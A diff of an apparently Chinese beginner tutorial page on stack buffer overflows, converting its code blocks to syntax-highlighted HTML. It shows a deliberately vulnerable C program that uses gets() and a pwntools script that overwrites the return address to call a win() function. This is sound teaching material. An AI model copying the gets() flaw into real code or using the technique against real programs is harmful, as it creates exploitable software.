@@ -17,23 +17,26 @@
 <blockquote>
 <p>go on!</p>
 </blockquote>
-<pre><code class="language-c">// ezoverflow.c
-#include &lt;stdio.h&gt;
+<pre><code class="language-c">
+<pre class="hljs"><code class="language-c">
+<span class="hljs-comment">// ezoverflow.c</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
 
-void win(){
-    printf(&quot;我被你控制了!真厉害!&quot;);
+<span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span>{
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;我被你控制了!真厉害!&quot;</span>);
 }
 
-void vuln() {
-    char buf[32];
+<span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span> {
+    <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>];
     gets(buf);
 }
 
-int main() {
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
     vuln();
-    return 0;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
 }
-</code></pre>
+
+</code></pre></code></pre>
 <p>⚠️ 注意：gets() 是一个十分危险的函数，不会检查输入长度，这正好让我们用来做演示。</p>
 <p>使用gcc编译</p>
 <blockquote>
@@ -127,18 +130,21 @@ int main() {
 <p>你会看到win函数的地址!(别忘了动手…)😄</p>
 <p>接下来就是用python写exploit脚本了!</p>
 <p>非常简单!</p>
-<pre><code class="language-python">//exploit.py
-from pwn import *
+<pre><code class="language-python">
+<pre class="hljs"><code class="language-python">
+//exploit.py
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 
-p=process('./ezoverflow')
+p=process(<span class="hljs-string">&#x27;./ezoverflow&#x27;</span>)
 
-win_addr = 0x...   #自己写上!
+win_addr = 0x...   <span class="hljs-comment">#自己写上!</span>
 
-payload = b'A' * 40
+payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">40</span>
 payload += p64(win_addr)
 
 p.sendline(payload)
-</code></pre>
+
+</code></pre></code></pre>
 <p>最后，你会看到:</p>
 <blockquote>
 <p>我被你控制了!真厉害!  😍😍😍😍</p>
